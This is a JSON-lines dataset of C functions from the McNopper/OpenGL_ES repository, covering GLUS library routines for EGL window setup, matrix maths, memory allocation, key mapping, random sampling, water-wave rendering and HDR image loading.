{"docstring": "/**\n * Main entry point.\n */\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n\tEGLint eglConfigAttributes[] = {\n\t        EGL_RED_SIZE, 8,\n\t        EGL_GREEN_SIZE, 8,\n\t        EGL_BLUE_SIZE, 8,\n\t        EGL_DEPTH_SIZE, 24,\n\t        EGL_RENDERABLE_TYPE, EGL_OPENGL_ES2_BIT,\n\t        EGL_NONE\n\t};\n\n    EGLint eglContextAttributes[] = {\n    \t\tEGL_CONTEXT_CLIENT_VERSION, 2,\n    \t\tEGL_NONE\n    };\n\n    glusWindowSetInitFunc(init);\n\n    glusWindowSetReshapeFunc(reshape);\n\n    glusWindowSetUpdateFunc(update);\n\n    glusWindowSetTerminateFunc(terminate);\n\n    if (!glusWindowCreate(\"GLUS Example Window\", 640, 480, GLUS_FALSE, GLUS_FALSE, eglConfigAttributes, eglContextAttributes, 0))\n    {\n        printf(\"Could not create window!\\n\");\n        return -1;\n    }\n\n    glusWindowRun();\n\n    return 0;\n}", "path": "Example01_ES2\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n", "func_signal": "GLUSboolean GLUSAPIENTRY glusMatrixNxNMultiplyVectorNc(GLUScomplex* result, const GLUScomplex* matrix, const GLUScomplex* vector, const GLUSint n)", "code": "{\n\tGLUSint row, column;\n\n\tGLUScomplex* temp = (GLUScomplex*)glusMemoryMalloc(n * sizeof(GLUScomplex));\n\n\tGLUScomplex muliplication;\n\n\tif (!temp)\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\tfor (row = 0; row < n; row++)\n\t{\n\t\tfor (column = 0; column < n; column++)\n\t\t{\n\t\t\tif (column == 0)\n\t\t\t{\n\t\t\t\ttemp[row].real = 0.0f;\n\t\t\t\ttemp[row].imaginary = 0.0f;\n\t\t\t}\n\n\t\t\tglusComplexMultiplyComplexc(&muliplication, &matrix[column * n + row], &vector[column]);\n\t\t\tglusComplexAddComplexc(&temp[row], &temp[row], &muliplication);\n\t\t}\n\t}\n\n\tfor (row = 0; row < n; row++)\n\t{\n\t\tresult[row] = temp[row];\n\t}\n\n\tglusMemoryFree(temp);\n\n\treturn GLUS_TRUE;\n}", "path": "GLUS\\src\\glus_matrix.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n", "func_signal": "GLUSboolean GLUSAPIENTRY glusWavefrontLoad(const GLUSchar* filename, GLUSwavefront* wavefront)", "code": "{\n\tGLUSshape dummyShape;\n\n\tif (!_glusWavefrontParse(filename, &dummyShape, wavefront, 0))\n\t{\n\t\tglusWavefrontDestroy(wavefront);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\tif (!_glusWavefrontMove(wavefront, &dummyShape))\n\t{\n\t\tglusWavefrontDestroy(wavefront);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\treturn GLUS_TRUE;\n}", "path": "GLUS\\src\\glus_wavefront.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "/**\n * Function to render and display content.\n */\n", "func_signal": "GLUSboolean renderWaterTexture(GLUSfloat passedTime)", "code": "{\n\tstatic WaveParameters waveParameters[NUMBERWAVES];\n\tstatic WaveDirections waveDirections[NUMBERWAVES];\n\n\tstatic GLfloat overallSteepness = 0.2f;\n\n\t// Waves\n\n    memset(waveParameters, 0, sizeof(waveParameters));\n    memset(waveDirections, 0, sizeof(waveDirections));\n\n\t// Wave One\n\twaveParameters[0].speed = 0.05f;\n\twaveParameters[0].amplitude = 0.02f;\n\twaveParameters[0].wavelength = 0.3f;\n\twaveParameters[0].steepness = overallSteepness / (waveParameters[0].wavelength * waveParameters[0].amplitude * (GLfloat) NUMBERWAVES);\n\twaveDirections[0].x = +1.0f;\n\twaveDirections[0].z = +1.5f;\n\n\t// Wave Two\n\twaveParameters[1].speed = 0.1f;\n\twaveParameters[1].amplitude = 0.01f;\n\twaveParameters[1].wavelength = 0.4f;\n\twaveParameters[1].steepness = overallSteepness / (waveParameters[1].wavelength * waveParameters[1].amplitude * (GLfloat) NUMBERWAVES);\n\twaveDirections[1].x = +0.8f;\n\twaveDirections[1].z = +0.2f;\n\n\t// Wave Thre\n\twaveParameters[2].speed = 0.04f;\n\twaveParameters[2].amplitude = 0.035f;\n\twaveParameters[2].wavelength = 0.1f;\n\twaveParameters[2].steepness = overallSteepness / (waveParameters[1].wavelength * waveParameters[1].amplitude * (GLfloat) NUMBERWAVES);\n\twaveDirections[2].x = -0.2f;\n\twaveDirections[2].z = -0.1f;\n\n\t// Wave Four\n\twaveParameters[3].speed = 0.05f;\n\twaveParameters[3].amplitude = 0.007f;\n\twaveParameters[3].wavelength = 0.2f;\n\twaveParameters[3].steepness = overallSteepness / (waveParameters[1].wavelength * waveParameters[1].amplitude * (GLfloat) NUMBERWAVES);\n\twaveDirections[3].x = -0.4f;\n\twaveDirections[3].z = -0.3f;\n\n    glViewport(0, 0, TEXTURE_SIZE, TEXTURE_SIZE);\n\n    glBindFramebuffer(GL_FRAMEBUFFER, g_fboWaterTexture);\n\n    //\n\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n\tglUseProgram(g_programWaterTexture.program);\n\n\tglUniform1f(g_passedTimeWaterTextureLocation, passedTime);\n\tglUniform4fv(g_waveParametersWaterTextureLocation, 4 * NUMBERWAVES, (GLfloat*) waveParameters);\n\tglUniform2fv(g_waveDirectionsWaterTextureLocation, 2 * NUMBERWAVES, (GLfloat*) waveDirections);\n\n    glFrontFace(GL_CCW);\n\n\tglBindVertexArray(g_vaoWaterTexture);\n\tglDrawElements(GL_TRIANGLES, g_numberIndicesWaterTexture, GL_UNSIGNED_INT, 0);\n\n\t//\n\n\tglBindFramebuffer(GL_FRAMEBUFFER, 0);\n\n\tglViewport(0, 0, g_parentWidth, g_parentHeight);\n\n\treturn GLUS_TRUE;\n}", "path": "Example15_ES\\src\\renderWaterTexture.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n", "func_signal": "void* GLUSAPIENTRY glusMemoryMalloc(size_t size)", "code": "{\n\tvoid* pointer = 0;\n\n\tif (size == 0)\n\t{\n\t\treturn pointer;\n\t}\n\n\tpointer = glusMemoryInternalMalloc(size);\n\n\t// If no memory was allocated ...\n\tif (!pointer)\n\t{\n\t\t// ... do garbage collection ...\n\t\tglusMemoryGarbageCollect();\n\n\t\t// ... and try to allocate again.\n\t\tpointer = glusMemoryInternalMalloc(size);\n\t}\n\n\treturn pointer;\n}", "path": "GLUS\\src\\glus_memory_nodm.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "// Map, if possible, to GLFW keys\n", "func_signal": "static int glusOsTranslateKey(int key)", "code": "{\n\tswitch (key)\n\t{\n\t\tcase KEY_SPACE:\n\t\t\treturn GLFW_KEY_SPACE;\n\t\tcase KEY_APOSTROPHE:\n\t\t\treturn GLFW_KEY_APOSTROPHE;\n\t\tcase KEY_COMMA:\n\t\t\treturn GLFW_KEY_COMMA;\n\t\tcase KEY_MINUS:\n\t\t\treturn GLFW_KEY_MINUS;\n\t\tcase KEY_DOT:\n\t\t\treturn GLFW_KEY_PERIOD;\n\t\tcase KEY_SLASH:\n\t\t\treturn GLFW_KEY_SLASH;\n\t\tcase KEY_0:\n\t\t\treturn GLFW_KEY_0;\n\t\tcase KEY_1:\n\t\t\treturn GLFW_KEY_1;\n\t\tcase KEY_2:\n\t\t\treturn GLFW_KEY_2;\n\t\tcase KEY_3:\n\t\t\treturn GLFW_KEY_3;\n\t\tcase KEY_4:\n\t\t\treturn GLFW_KEY_4;\n\t\tcase KEY_5:\n\t\t\treturn GLFW_KEY_5;\n\t\tcase KEY_6:\n\t\t\treturn GLFW_KEY_6;\n\t\tcase KEY_7:\n\t\t\treturn GLFW_KEY_7;\n\t\tcase KEY_8:\n\t\t\treturn GLFW_KEY_8;\n\t\tcase KEY_9:\n\t\t\treturn GLFW_KEY_9;\n\t\tcase KEY_SEMICOLON:\n\t\t\treturn GLFW_KEY_SEMICOLON;\n\t\tcase KEY_EQUAL:\n\t\t\treturn GLFW_KEY_EQUAL;\n\t\tcase KEY_A:\n\t\t\treturn GLFW_KEY_A;\n\t\tcase KEY_B:\n\t\t\treturn GLFW_KEY_B;\n\t\tcase KEY_C:\n\t\t\treturn GLFW_KEY_C;\n\t\tcase KEY_D:\n\t\t\treturn GLFW_KEY_D;\n\t\tcase KEY_E:\n\t\t\treturn GLFW_KEY_E;\n\t\tcase KEY_F:\n\t\t\treturn GLFW_KEY_F;\n\t\tcase KEY_G:\n\t\t\treturn GLFW_KEY_G;\n\t\tcase KEY_H:\n\t\t\treturn GLFW_KEY_H;\n\t\tcase KEY_I:\n\t\t\treturn GLFW_KEY_I;\n\t\tcase KEY_J:\n\t\t\treturn GLFW_KEY_J;\n\t\tcase KEY_K:\n\t\t\treturn GLFW_KEY_K;\n\t\tcase KEY_L:\n\t\t\treturn GLFW_KEY_L;\n\t\tcase KEY_M:\n\t\t\treturn GLFW_KEY_M;\n\t\tcase KEY_N:\n\t\t\treturn GLFW_KEY_N;\n\t\tcase KEY_O:\n\t\t\treturn GLFW_KEY_O;\n\t\tcase KEY_P:\n\t\t\treturn GLFW_KEY_P;\n\t\tcase KEY_Q:\n\t\t\treturn GLFW_KEY_Q;\n\t\tcase KEY_R:\n\t\t\treturn GLFW_KEY_R;\n\t\tcase KEY_S:\n\t\t\treturn GLFW_KEY_S;\n\t\tcase KEY_T:\n\t\t\treturn GLFW_KEY_T;\n\t\tcase KEY_U:\n\t\t\treturn GLFW_KEY_U;\n\t\tcase KEY_V:\n\t\t\treturn GLFW_KEY_V;\n\t\tcase KEY_W:\n\t\t\treturn GLFW_KEY_W;\n\t\tcase KEY_X:\n\t\t\treturn GLFW_KEY_X;\n\t\tcase KEY_Y:\n\t\t\treturn GLFW_KEY_Y;\n\t\tcase KEY_Z:\n\t\t\treturn GLFW_KEY_Z;\n\t\tcase KEY_LEFTBRACE:\n\t\t\treturn GLFW_KEY_LEFT_BRACKET;\n\t\tcase KEY_BACKSLASH:\n\t\t\treturn GLFW_KEY_BACKSLASH;\n\t\tcase KEY_RIGHTBRACE:\n\t\t\treturn GLFW_KEY_RIGHT_BRACKET;\n\t\tcase KEY_GRAVE:\n\t\t\treturn GLFW_KEY_GRAVE_ACCENT;\n\t\tcase KEY_ESC:\n\t\t\treturn GLFW_KEY_ESCAPE;\n\t\tcase KEY_F1:\n\t\t\treturn GLFW_KEY_F1;\n\t\tcase KEY_F2:\n\t\t\treturn GLFW_KEY_F2;\n\t\tcase KEY_F3:\n\t\t\treturn GLFW_KEY_F3;\n\t\tcase KEY_F4:\n\t\t\treturn GLFW_KEY_F4;\n\t\tcase KEY_F5:\n\t\t\treturn GLFW_KEY_F5;\n\t\tcase KEY_F6:\n\t\t\treturn GLFW_KEY_F6;\n\t\tcase KEY_F7:\n\t\t\treturn GLFW_KEY_F7;\n\t\tcase KEY_F8:\n\t\t\treturn GLFW_KEY_F8;\n\t\tcase KEY_F9:\n\t\t\treturn GLFW_KEY_F9;\n\t\tcase KEY_F10:\n\t\t\treturn GLFW_KEY_F10;\n\t\tcase KEY_F11:\n\t\t\treturn GLFW_KEY_F11;\n\t\tcase KEY_F12:\n\t\t\treturn GLFW_KEY_F12;\n\t\tcase KEY_F13:\n\t\t\treturn GLFW_KEY_F13;\n\t\tcase KEY_F14:\n\t\t\treturn GLFW_KEY_F14;\n\t\tcase KEY_F15:\n\t\t\treturn GLFW_KEY_F15;\n\t\tcase KEY_UP:\n\t\t\treturn GLFW_KEY_UP;\n\t\tcase KEY_DOWN:\n\t\t\treturn GLFW_KEY_DOWN;\n\t\tcase KEY_LEFT:\n\t\t\treturn GLFW_KEY_LEFT;\n\t\tcase KEY_RIGHT:\n\t\t\treturn GLFW_KEY_RIGHT;\n\t\tcase KEY_LEFTSHIFT:\n\t\t\treturn GLFW_KEY_LEFT_SHIFT;\n\t\tcase KEY_RIGHTSHIFT:\n\t\t\treturn GLFW_KEY_RIGHT_SHIFT;\n\t\tcase KEY_LEFTCTRL:\n\t\t\treturn GLFW_KEY_LEFT_CONTROL;\n\t\tcase KEY_RIGHTCTRL:\n\t\t\treturn GLFW_KEY_RIGHT_CONTROL;\n\t\tcase KEY_LEFTALT:\n\t\t\treturn GLFW_KEY_LEFT_ALT;\n\t\tcase KEY_RIGHTALT:\n\t\t\treturn GLFW_KEY_RIGHT_ALT;\n\t\tcase KEY_TAB:\n\t\t\treturn GLFW_KEY_TAB;\n\t\tcase KEY_ENTER:\n\t\t\treturn GLFW_KEY_ENTER;\n\t\tcase KEY_BACKSPACE:\n\t\t\treturn GLFW_KEY_BACKSPACE;\n\t\tcase KEY_INSERT:\n\t\t\treturn GLFW_KEY_INSERT;\n\t\tcase KEY_DELETE:\n\t\t\treturn GLFW_KEY_DELETE;\n\t\tcase KEY_PAGEUP:\n\t\t\treturn GLFW_KEY_PAGE_UP;\n\t\tcase KEY_PAGEDOWN:\n\t\t\treturn GLFW_KEY_PAGE_DOWN;\n\t\tcase KEY_HOME:\n\t\t\treturn GLFW_KEY_HOME;\n\t\tcase KEY_END:\n\t\t\treturn GLFW_KEY_END;\n\t\tcase KEY_KP0:\n\t\t\treturn GLFW_KEY_KP_0;\n\t\tcase KEY_KP1:\n\t\t\treturn GLFW_KEY_KP_1;\n\t\tcase KEY_KP2:\n\t\t\treturn GLFW_KEY_KP_2;\n\t\tcase KEY_KP3:\n\t\t\treturn GLFW_KEY_KP_3;\n\t\tcase KEY_KP4:\n\t\t\treturn GLFW_KEY_KP_4;\n\t\tcase KEY_KP5:\n\t\t\treturn GLFW_KEY_KP_5;\n\t\tcase KEY_KP6:\n\t\t\treturn GLFW_KEY_KP_6;\n\t\tcase KEY_KP7:\n\t\t\treturn GLFW_KEY_KP_7;\n\t\tcase KEY_KP8:\n\t\t\treturn GLFW_KEY_KP_8;\n\t\tcase KEY_KP9:\n\t\t\treturn GLFW_KEY_KP_9;\n\t\tcase KEY_KPSLASH:\n\t\t\treturn GLFW_KEY_KP_DIVIDE;\n\t\tcase KEY_KPASTERISK:\n\t\t\treturn GLFW_KEY_KP_MULTIPLY;\n\t\tcase KEY_KPMINUS:\n\t\t\treturn GLFW_KEY_KP_SUBTRACT;\n\t\tcase KEY_KPPLUS:\n\t\t\treturn GLFW_KEY_KP_ADD;\n\t\tcase KEY_KPDOT:\n\t\t\treturn GLFW_KEY_KP_DECIMAL;\n\t\tcase KEY_KPEQUAL:\n\t\t\treturn GLFW_KEY_KP_EQUAL;\n\t\tcase KEY_KPENTER:\n\t\t\treturn GLFW_KEY_KP_ENTER;\n\t\tcase KEY_NUMLOCK:\n\t\t\treturn GLFW_KEY_NUM_LOCK;\n\t\tcase KEY_CAPSLOCK:\n\t\t\treturn GLFW_KEY_CAPS_LOCK;\n\t\tcase KEY_SCROLLLOCK:\n\t\t\treturn GLFW_KEY_SCROLL_LOCK;\n\t\tcase KEY_PAUSE:\n\t\t\treturn GLFW_KEY_PAUSE;\n\t\tcase KEY_LEFTMETA:\n\t\t\treturn GLFW_KEY_LEFT_SUPER;\n\t\tcase KEY_RIGHTMETA:\n\t\t\treturn GLFW_KEY_RIGHT_SUPER;\n\t\tcase KEY_MENU:\n\t\t\treturn GLFW_KEY_MENU;\n\t\tdefault:\n\t\t\treturn key;\n\t}\n\n\treturn GLFW_KEY_UNKNOWN;\n}", "path": "GLUS\\src\\glus_os_linux_imx6_es.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "/**\n * Function to render and display content. Swapping of the buffers is automatically done.\n *\n * @return true for continuing, false to exit the application\n */\n", "func_signal": "GLUSboolean update(GLUSfloat time)", "code": "{\n    // Now, the background is painted blue.\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    return GLUS_TRUE;\n}", "path": "Example01_ES2\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "// see http://mathworld.wolfram.com/HammersleyPointSet.html\n// see https://github.com/wdas/brdf/blob/master/src/shaderTemplates/brdfIBL.frag\n", "func_signal": "GLUSboolean GLUSAPIENTRY glusRandomHammersleyf(GLUSfloat result[2], const GLUSuint sample, const GLUSubyte m)", "code": "{\n\tGLUSuint revertSample;\n\tGLUSfloat binaryFractionFactor;\n\n\tif (!result)\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\t// Check, if m is in the allowed range, as only 32bit unsigned integer is supported.\n\tif (m == 0 || m > 32)\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\t// If not all bits are used: Check, if sample is out of bounds.\n\tif (m < 32 && sample >= (GLUSuint)(1 << m))\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\t// Revert bits by swapping blockwise. Lower bits are moved up and higher bits down.\n\trevertSample = (sample << 16u) | (sample >> 16u);\n\trevertSample = ((revertSample & 0x00ff00ffu) << 8u) | ((revertSample & 0xff00ff00u) >> 8u);\n\trevertSample = ((revertSample & 0x0f0f0f0fu) << 4u) | ((revertSample & 0xf0f0f0f0u) >> 4u);\n\trevertSample = ((revertSample & 0x33333333u) << 2u) | ((revertSample & 0xccccccccu) >> 2u);\n\trevertSample = ((revertSample & 0x55555555u) << 1u) | ((revertSample & 0xaaaaaaaau) >> 1u);\n\n\t// Shift back, as only m bits are used.\n\trevertSample = revertSample >> (32 - m);\n\n\t// Results are in range [0.0 1.0] and not [0.0, 1.0[.\n\tbinaryFractionFactor = 1.0f / (powf(2.0f, (GLUSfloat)m) - 1.0f);\n\n\tresult[0] = (GLUSfloat)revertSample * binaryFractionFactor;\n\tresult[1] = (GLUSfloat)sample * binaryFractionFactor;\n\n\treturn GLUS_TRUE;\n}", "path": "GLUS\\src\\glus_random.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "/**\n * Main entry point.\n */\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n\tEGLint eglConfigAttributes[] = {\n\t        EGL_RED_SIZE, 8,\n\t        EGL_GREEN_SIZE, 8,\n\t        EGL_BLUE_SIZE, 8,\n\t        EGL_DEPTH_SIZE, 24,\n\t        EGL_RENDERABLE_TYPE, EGL_OPENGL_ES2_BIT,\n\t        EGL_NONE\n\t};\n\n    EGLint eglContextAttributes[] = {\n    \t\tEGL_CONTEXT_CLIENT_VERSION, 3,\n    \t\tEGL_NONE\n    };\n\n    glusWindowSetInitFunc(init);\n\n    glusWindowSetReshapeFunc(reshape);\n\n    glusWindowSetUpdateFunc(update);\n\n    glusWindowSetTerminateFunc(terminate);\n\n    if (!glusWindowCreate(\"GLUS Example Window\", 640, 480, GLUS_FALSE, GLUS_FALSE, eglConfigAttributes, eglContextAttributes, 0))\n    {\n        printf(\"Could not create window!\\n\");\n        return -1;\n    }\n\n    glusWindowRun();\n\n    return 0;\n}", "path": "Example15_ES\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n", "func_signal": "GLUSvoid GLUSAPIENTRY glusMatrix4x4Identityf(GLUSfloat matrix[16])", "code": "{\n    matrix[0] = 1.0f;\n    matrix[1] = 0.0f;\n    matrix[2] = 0.0f;\n    matrix[3] = 0.0f;\n\n    matrix[4] = 0.0f;\n    matrix[5] = 1.0f;\n    matrix[6] = 0.0f;\n    matrix[7] = 0.0f;\n\n    matrix[8] = 0.0f;\n    matrix[9] = 0.0f;\n    matrix[10] = 1.0f;\n    matrix[11] = 0.0f;\n\n    matrix[12] = 0.0f;\n    matrix[13] = 0.0f;\n    matrix[14] = 0.0f;\n    matrix[15] = 1.0f;\n}", "path": "GLUS\\src\\glus_matrix.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "// see http://mathworld.wolfram.com/Box-MullerTransformation.html\n", "func_signal": "GLUSfloat GLUSAPIENTRY glusRandomNormalf(const GLUSfloat mean, const GLUSfloat standardDeviation)", "code": "{\n\tGLUSfloat x1, x2;\n\n\t// Avoid logf(0.0f) and logf(1.0f)\n\tx1 = glusRandomUniformf(GLUS_UNIFORM_RANDOM_BIAS, 1.0f - GLUS_UNIFORM_RANDOM_BIAS);\n\tx2 = glusRandomUniformf(0.0f, 1.0f);\n\n\treturn mean + standardDeviation * (sqrtf(-2.0f * logf(x1)) * cosf(2.0f * GLUS_PI * x2));\n}", "path": "GLUS\\src\\glus_random.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "/**\n * Function for initialization.\n */\n", "func_signal": "GLUSboolean init(GLUSvoid)", "code": "{\n    // The background will just cleared with blue color.\n    glClearColor(0.0f, 0.0f, 1.0f, 0.0f);\n\n    return GLUS_TRUE;\n}", "path": "Example01_ES\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "/**\n * Function to render and display content. Swapping of the buffers is automatically done.\n *\n * @return true for continuing, false to exit the application\n */\n", "func_signal": "GLUSboolean update(GLUSfloat time)", "code": "{\n    // Now, the background is painted blue.\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    return GLUS_TRUE;\n}", "path": "Example01_ES\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n// HDR Image loading\n//\n// see http://radsite.lbl.gov/radiance/refer/filefmts.pdf\n// see http://radsite.lbl.gov/radiance/refer/Notes/picture_format.html\n// see http://radiance-online.org/cgi-bin/viewcvs.cgi/ray/src/common/color.c?view=markup\n// see http://www.flipcode.com/archives/HDR_Image_Reader.shtml\n", "func_signal": "GLUSboolean GLUSAPIENTRY glusImageLoadHdr(const GLUSchar* filename, GLUShdrimage* hdrimage)", "code": "{\n\tFILE* file;\n\n\tGLUSchar buffer[256];\n\tGLUSchar currentChar, oldChar;\n\n\tGLUSint width, height, x, y, repeat, factor, i;\n\n\tGLUSubyte* scanline;\n\tGLUSubyte rgbe[4];\n\tGLUSubyte prevRgbe[4];\n\n\tGLUSfloat rgb[3];\n\n\tsize_t elementsRead;\n\n\t// check, if we have a valid pointer\n\tif (!filename || !hdrimage)\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\thdrimage->width = 0;\n\thdrimage->height = 0;\n\thdrimage->depth = 0;\n\thdrimage->data = 0;\n\n\t// open filename in \"read binary\" mode\n\tfile = glusFileOpen(filename, \"rb\");\n\n\tif (!file)\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\telementsRead = fread(buffer, 10, 1, file);\n\n\tif (!_glusFileCheckRead(file, elementsRead, 1))\n\t{\n\t\treturn GLUS_FALSE;\n\t}\n\n\t//\n\t// Information header\n\t//\n\n\t// Identifier\n\tif (strncmp(buffer, \"#?RADIANCE\", 10))\n\t{\n\t\tglusFileClose(file);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\t// Go to variables\n\tif (fseek(file, 1, SEEK_CUR))\n\t{\n\t\tglusFileClose(file);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\t// Variables\n\tcurrentChar = 0;\n\twhile (GLUS_TRUE)\n\t{\n\t\toldChar = currentChar;\n\n\t\telementsRead = fread(&currentChar, 1, 1, file);\n\n\t\tif (!_glusFileCheckRead(file, elementsRead, 1))\n\t\t{\n\t\t\treturn GLUS_FALSE;\n\t\t}\n\n\t\t// Empty line indicates end of header\n\t\tif (currentChar == '\\n' && oldChar == '\\n')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// Resolution\n\ti = 0;\n\twhile (GLUS_TRUE)\n\t{\n\t\telementsRead = fread(&currentChar, 1, 1, file);\n\n\t\tif (!_glusFileCheckRead(file, elementsRead, 1))\n\t\t{\n\t\t\treturn GLUS_FALSE;\n\t\t}\n\n\t\tbuffer[i++] = currentChar;\n\n\t\tif (currentChar == '\\n')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (!sscanf(buffer, \"-Y %d +X %d\", &height, &width))\n\t{\n\t\tglusFileClose(file);\n\n\t\tglusImageDestroyHdr(hdrimage);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\thdrimage->width = (GLUSushort)width;\n\thdrimage->height = (GLUSushort)height;\n\thdrimage->depth = 1;\n\thdrimage->format = GLUS_RGB;\n\n\thdrimage->data = (GLUSfloat*)glusMemoryMalloc(width * height * 3 * sizeof(GLUSfloat));\n\n\tif (!hdrimage->data)\n\t{\n\t\tglusFileClose(file);\n\n\t\tglusImageDestroyHdr(hdrimage);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\t// Scanlines\n\tscanline = (GLUSubyte*)glusMemoryMalloc(width * 4 * sizeof(GLUSubyte));\n\n\tif (!scanline)\n\t{\n\t\tglusMemoryFree(scanline);\n\n\t\tglusFileClose(file);\n\n\t\tglusImageDestroyHdr(hdrimage);\n\n\t\treturn GLUS_FALSE;\n\t}\n\n\tprevRgbe[0] = 0;\n\tprevRgbe[1] = 0;\n\tprevRgbe[2] = 0;\n\tprevRgbe[3] = 0;\n\n\tfactor = 1;\n\tx = 0;\n\ty = height - 1;\n\twhile (y >= 0)\n\t{\n\t\telementsRead = fread(buffer, 4, 1, file);\n\n\t\tif (!_glusFileCheckRead(file, elementsRead, 1))\n\t\t{\n\t\t\tglusMemoryFree(scanline);\n\n\t\t\tglusImageDestroyHdr(hdrimage);\n\n\t\t\treturn GLUS_FALSE;\n\t\t}\n\n\t\trepeat = 0;\n\n\t\t// Examine value\n\t\tif (width < 32768 && buffer[0] == 2 && buffer[1] == 2 && buffer[2] == ((width >> 8) & 0xFF) && buffer[3] == (width & 0xFF))\n\t\t{\n\t\t\t// New RLE decoding\n\n\t\t\tGLUSint scanlinePixels = glusImageDecodeNewRLE(file, scanline, width);\n\n\t\t\tif (scanlinePixels < 0)\n\t\t\t{\n\t\t\t\tglusMemoryFree(scanline);\n\n\t\t\t\t// File already closed\n\n\t\t\t\tglusImageDestroyHdr(hdrimage);\n\n\t\t\t\treturn GLUS_FALSE;\n\t\t\t}\n\n\t\t\tfor (i = 0; i < scanlinePixels; i++)\n\t\t\t{\n\t\t\t\tif (y < 0)\n\t\t\t\t{\n\t\t\t\t\tglusMemoryFree(scanline);\n\n\t\t\t\t\tglusFileClose(file);\n\n\t\t\t\t\tglusImageDestroyHdr(hdrimage);\n\n\t\t\t\t\treturn GLUS_FALSE;\n\t\t\t\t}\n\n\t\t\t\tglusImageConvertRGBE(rgb, &scanline[i * 4]);\n\n\t\t\t\thdrimage->data[(width * y + x) * 3 + 0] = rgb[0];\n\t\t\t\thdrimage->data[(width * y + x) * 3 + 1] = rgb[1];\n\t\t\t\thdrimage->data[(width * y + x) * 3 + 2] = rgb[2];\n\n\t\t\t\tx++;\n\t\t\t\tif (x >= width)\n\t\t\t\t{\n\t\t\t\t\ty--;\n\t\t\t\t\tx = 0;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tfactor = 1;\n\n\t\t\tprevRgbe[0] = scanline[(scanlinePixels - 1) * 4 + 0];\n\t\t\tprevRgbe[1] = scanline[(scanlinePixels - 1) * 4 + 1];\n\t\t\tprevRgbe[2] = scanline[(scanlinePixels - 1) * 4 + 2];\n\t\t\tprevRgbe[3] = scanline[(scanlinePixels - 1) * 4 + 3];\n\n\t\t\tcontinue;\n\t\t}\n\t\telse if (buffer[0] == 1 && buffer[1] == 1 && buffer[2] == 1)\n\t\t{\n\t\t\t// Old RLE decoding\n\n\t\t\trepeat = buffer[3] * factor;\n\n\t\t\trgbe[0] = prevRgbe[0];\n\t\t\trgbe[1] = prevRgbe[1];\n\t\t\trgbe[2] = prevRgbe[2];\n\t\t\trgbe[3] = prevRgbe[3];\n\n\t\t\tfactor *= 256;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// No RLE decoding\n\n\t\t\trepeat = 1;\n\n\t\t\trgbe[0] = buffer[0];\n\t\t\trgbe[1] = buffer[1];\n\t\t\trgbe[2] = buffer[2];\n\t\t\trgbe[3] = buffer[3];\n\n\t\t\tfactor = 1;\n\t\t}\n\n\t\tglusImageConvertRGBE(rgb, rgbe);\n\n\t\twhile (repeat)\n\t\t{\n\t\t\tif (y < 0)\n\t\t\t{\n\t\t\t\tglusMemoryFree(scanline);\n\n\t\t\t\tglusFileClose(file);\n\n\t\t\t\tglusImageDestroyHdr(hdrimage);\n\n\t\t\t\treturn GLUS_FALSE;\n\t\t\t}\n\n\t\t\thdrimage->data[(width * y + x) * 3 + 0] = rgb[0];\n\t\t\thdrimage->data[(width * y + x) * 3 + 1] = rgb[1];\n\t\t\thdrimage->data[(width * y + x) * 3 + 2] = rgb[2];\n\n\t\t\tx++;\n\t\t\tif (x >= width)\n\t\t\t{\n\t\t\t\ty--;\n\t\t\t\tx = 0;\n\t\t\t}\n\n\t\t\trepeat--;\n\t\t}\n\n\t\tprevRgbe[0] = rgbe[0];\n\t\tprevRgbe[1] = rgbe[1];\n\t\tprevRgbe[2] = rgbe[2];\n\t\tprevRgbe[3] = rgbe[3];\n\t}\n\n\tglusMemoryFree(scanline);\n\n\tglusFileClose(file);\n\n\treturn GLUS_TRUE;\n}", "path": "GLUS\\src\\glus_image_hdr.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
